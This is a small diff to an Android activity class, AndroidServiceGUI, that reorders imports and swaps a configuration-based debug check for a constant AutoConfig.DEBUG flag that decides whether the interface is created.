@@ -9,9 +9,6 @@
 
 package com.android.service.gui;
 
-import com.android.service.R;
-import com.android.service.conf.Configuration;
-
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
@@ -22,6 +19,8 @@ import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.ToggleButton;
 
+import com.android.service.R;
+import com.android.service.auto.AutoConfig;
 
 /**
  * The Class AndroidServiceGUI.
@@ -38,7 +37,7 @@ public class AndroidServiceGUI extends Activity {
 	 */
 	@Override
 	public void onCreate(final Bundle savedInstanceState) {
-		if(Configuration.isDebug()){
+		if(AutoConfig.DEBUG){
 			actualCreate(savedInstanceState);
 		}
 	}
